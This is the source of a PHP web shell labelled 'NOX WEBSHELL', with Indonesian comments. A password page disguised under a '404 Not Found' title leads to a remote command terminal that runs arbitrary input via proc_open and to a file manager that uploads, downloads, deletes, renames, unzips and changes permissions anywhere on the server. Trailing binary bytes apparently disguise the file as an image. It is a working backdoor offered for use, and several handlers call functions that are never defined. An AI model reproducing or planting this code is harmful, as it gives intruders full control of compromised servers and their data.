<?php
session_start();
session_regenerate_id(true);

// Tambahkan timeout
if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 1800)) {
    session_unset();
    session_destroy();
}
$_SESSION['LAST_ACTIVITY'] = time();

// Mengganti password_hash ke md5 untuk PHP 5.6 (ini kurang aman)
$hashed_password = md5('passwordAnda'); // Ganti 'passwordAnda' dengan password asli Anda

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['submit_password'])) {
        if (md5($_POST['password']) === $hashed_password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Password salah!";
        }
    }
    
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 Not Found</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
        <style>
            body { 
                background-color: #343a40;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-container {
                background-color: #495057;
                padding: 20px;
                border-radius: 10px;
                width: 300px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2 class="text-center mb-4">NOX WEBSHELL</h2>
            <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
            <form method="post">
                <div class="form-group">
                    <input type="password" name="password" class="form-control" placeholder="Enter password" required>
                </div>
                <button type="submit" name="submit_password" class="btn btn-primary btn-block">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

function executeCommand($input) {
    $isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    if ($isWindows && trim($input) === 'ls') {
        $input = 'dir';
    }

    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    if ($isWindows) {
        $process = proc_open('cmd /c ' . $input, $descriptors, $pipes);
    } else {
        $process = proc_open($input, $descriptors, $pipes);
    }

    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $errorOutput = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $exitCode = proc_close($process);

        if ($exitCode === 0) {
            return $output;
        } else {
            return "Error: " . $errorOutput;
        }
    } else {
        return "Tidak dapat menjalankan perintah\n";
    }
}

// Dan perbaiki bagian untuk menangani output terminal
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = executeCommand($command);
}

function unzip_file($zipfile) {
    $zip = new ZipArchive;
    $destination = dirname($zipfile);
    if ($zip->open($zipfile) === TRUE) {
        $zip->extractTo($destination);
        $zip->close();
        echo '<div class="alert alert-success">File berhasil di-unzip ke: ' . $destination . '</div>';
    } else {
        echo '<div class="alert alert-danger">Gagal membuka file zip</div>';
    }
}

function delete($path, $type = 'file') {
    if (!file_exists($path)) {
        return false;
    }
    
    if ($type == 'folder') {
        return removeDirectory($path);
    } else {
        return unlink($path);
    }
}

function removeDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    
    $files = array_diff(scandir($dir), array('.','..'));
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        is_dir($path) ? removeDirectory($path) : unlink($path);
    }
    return rmdir($dir);
}

function create_folder($folder_path) {
    if (!file_exists($folder_path)) {
        if (mkdir($folder_path)) {
            echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_path . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal membuat folder: ' . $folder_path . '</div>';
        }
    } else {
        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_path . '</div>';
    }
}

function create_file($file_path, $content) {
    if (file_put_contents($file_path, $content) !== false) {
        echo '<div class="alert alert-success">File berhasil dibuat: ' . $file_path . '</div>';
    } else {
        echo '<div class="alert alert-danger">Gagal membuat file: ' . $file_path . '</div>';
    }
}

function rename_item($old_path, $new_name, $type = 'file') {
    $dir = dirname($old_path);
    $new_path = $dir . DIRECTORY_SEPARATOR . $new_name;
    
    if (!file_exists($old_path)) {
        return ["success" => false, "message" => "$type tidak ditemukan"];
    }
    
    if (file_exists($new_path)) {
        return ["success" => false, "message" => "$type dengan nama tersebut sudah ada"];
    }
    
    if (rename($old_path, $new_path)) {
        return ["success" => true, "message" => "$type berhasil diubah nama"];
    }
    return ["success" => false, "message" => "Gagal mengubah nama $type"];
}

function change_permissions($file, $permissions) {
    if (file_exists($file)) {
        if (chmod($file, octdec($permissions))) {
            echo '<div class="alert alert-success">Izin file berhasil diubah: ' . $file . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal mengubah izin file: ' . $file . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// Tentukan direktori saat ini
$dir = $_GET['path'] ?? __DIR__;

// Logika untuk form
if (isset($_POST['submit'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    $upload_dir = $_POST['path'] ?? $dir;
    move_uploaded_file($file_tmp, $upload_dir . '/' . $file_name);
}

if (isset($_POST['unzip'])) {
    unzip_file($dir . '/' . $_POST['zip_file']);
}

if (isset($_POST['create_folder'])) {
    $folder_dir = $_POST['path'] ?? $dir;
    create_folder($folder_dir . '/' . $_POST['folder_name']);
}

if (isset($_POST['create_file'])) {
    $file_dir = $_POST['path'] ?? $dir;
    create_file($file_dir . '/' . $_POST['file_name'], $_POST['file_content']);
}

if (isset($_GET['delete'])) {
    delete($dir . '/' . $_GET['delete']);
}

if (isset($_POST['rename_file'])) {
    rename_file($dir . '/' . $_POST['file_name'], $_POST['new_name']);
}

if (isset($_POST['rename_folder'])) {
    rename_folder($dir . '/' . $_POST['folder_name'], $_POST['new_name']);
}

if (isset($_POST['change_permissions'])) {
    change_permissions($dir . '/' . $_POST['file_name'], $_POST['permissions']);
}

if (isset($_GET['delete_folder'])) {
    $folder_to_delete = $dir . '/' . $_GET['delete_folder'];
    if (delete($folder_to_delete, 'folder')) {
        echo '<div class="alert alert-success">Folder berhasil dihapus: ' . $_GET['delete_folder'] . '</div>';
    } else {
        echo '<div class="alert alert-danger">Gagal menghapus folder: ' . $_GET['delete_folder'] . '</div>';
    }
}

if (isset($_GET['download'])) {
    $file = $dir . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Tampilkan file dan folder
function display_path_links($path) {
    $parts = explode('/', $path);
    $accumulated_path = '';
    foreach ($parts as $part) {
        if ($part) {
            $accumulated_path .= '/' . $part;
            echo '<a href="?path=' . urlencode($accumulated_path) . '">' . $part . '</a>/';
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        body {
            background-color: #343a40;
            color: white;
        }
        .container {
            background-color: #495057;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .list-group-item-success {
            background-color: green;
            color: white;
        }
        .list-group-item-danger {
            background-color: red;
            color: white;
        }
        a {
            color: black;
        }
        a:hover {
            color: blue;
        }
        .permissions {
            font-family: monospace;
            color: green; /* Bright light blue color */
            margin-right: 10px;
            display: inline-block;
            width: 100px; /* Fixed width for alignment */
        }
        .file-item, .folder-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .file-actions, .folder-actions {
            display: flex;
            align-items: center;
        }
        .file-actions form {
        display: inline-block;
        }
        .file-actions .btn {
            padding: .25rem .5rem;
        }
        .file-actions .form-control-sm {
            height: calc(1.5em + .5rem + 2px);
            padding: .25rem .5rem;
            font-size: .875rem;
            line-height: 1.5;
            border-radius: .2rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-center mb-4">File Manager</h1>
        <h3>Current Path:</h3>
        <div class="mb-3">
            <?php display_path_links(realpath($dir)); ?>
        </div>

        <div class="text-center mb-4">
            <a href="?path=<?php echo urlencode($dir); ?>&action=upload" class="btn btn-primary btn-sm mx-2" title="Upload File">
                <i class="fas fa-upload"></i> Upload
            </a>
            <a href="?path=<?php echo urlencode($dir); ?>&action=create_folder" class="btn btn-success btn-sm mx-2" title="Create New Folder">
                <i class="fas fa-folder-plus"></i> New Folder
            </a>
            <a href="?path=<?php echo urlencode($dir); ?>&action=create_file" class="btn btn-info btn-sm mx-2" title="Create New File">
                <i class="fas fa-file-medical"></i> New File
            </a>
        </div>

        <?php
        if (isset($_GET['action'])) {
            switch ($_GET['action']) {
                case 'upload':
                    display_upload_form($dir);
                    break;
                case 'create_folder':
                    display_create_folder_form($dir);
                    break;
                case 'create_file':
                    display_create_file_form($dir);
                    break;
            }
        }
        ?>

        <hr>

        <h3>Terminal:</h3>
        <form method="post">
            <div class="form-group">
                <label for="command">Command:</label>
                <input type="text" name="command" class="form-control" id="command" required>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>

        <?php if (!empty($output)): ?>
            <pre class="mt-3 p-3 bg-dark text-light"><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>

        <h3>Files and Folders:</h3>
        <ul class="list-group">
            <?php
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;

                $filePath = $dir . '/' . $file;
                $permissions = get_permissions($filePath);
                if (is_dir($filePath)) {
                    echo '<li class="list-group-item folder-item">';
                    echo '<div>';
                    echo '<span class="permissions">' . $permissions . '</span>';
                    echo '<a href="?path=' . urlencode($filePath) . '">' . $file . '</a>';
                    echo '</div>';
                    echo '<div class="folder-actions">';
                    echo '<form method="post" class="form-inline ml-2">';
                    echo '<input type="hidden" name="folder_name" value="' . $file . '">';
                    echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
                    echo '<button type="submit" name="rename_folder" class="btn btn-warning btn-sm ml-1" title="Rename"><i class="fas fa-edit"></i></button>';
                    echo '</form>';
                    echo '<a href="?path=' . urlencode($dir) . '&delete_folder=' . urlencode($file) . '" class="btn btn-danger btn-sm ml-2" title="Delete Folder" onclick="return confirm(\'Are you sure you want to delete this folder and all its contents?\');"><i class="fas fa-trash"></i></a>';
                    echo '</div>';
                    echo '</li>';
                } else {
                    echo '<li class="list-group-item file-item">';
                    echo '<div>';
                    echo '<span class="permissions">' . $permissions . '</span>';
                    echo '<a href="?path=' . urlencode($dir) . '&download=' . urlencode($file) . '">' . $file . '</a>';
                    echo '</div>';
                    echo '<div class="file-actions">';
                    echo '<a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="btn btn-danger btn-sm ml-2" title="Delete"><i class="fas fa-trash"></i></a>';
                    
                    if (pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
                        echo '<form method="post" class="form-inline ml-2" style="display:inline;">';
                        echo '<input type="hidden" name="zip_file" value="' . $file . '">';
                        echo '<button type="submit" name="unzip" class="btn btn-primary btn-sm" title="Unzip"><i class="fas fa-file-archive"></i></button>';
                        echo '</form>';
                    }
                    
                    echo '<form method="post" class="form-inline ml-2" style="display:inline;">';
                    echo '<input type="hidden" name="file_name" value="' . $file . '">';
                    echo '<input type="text" name="new_name" class="form-control form-control-sm" placeholder="New name" required style="width: 100px;">';
                    echo '<button type="submit" name="rename_file" class="btn btn-warning btn-sm ml-1" title="Rename"><i class="fas fa-edit"></i></button>';
                    echo '</form>';
                    
                    echo '<form method="post" class="form-inline ml-2" style="display:inline;">';
                    echo '<input type="hidden" name="file_name" value="' . $file . '">';
                    echo '<input type="text" name="permissions" class="form-control form-control-sm" placeholder="Permissions" required style="width: 100px;">';
                    echo '<button type="submit" name="change_permissions" class="btn btn-info btn-sm ml-1" title="Change Permissions"><i class="fas fa-key"></i></button>';
                    echo '</form>';
                    echo '</div>';
                    echo '</li>';
                }
            }
            ?>
        </ul>
    </div>
</body>
</html>









			

		


�� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) $��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�~~�t�U�Cڒ�V		I1��_��
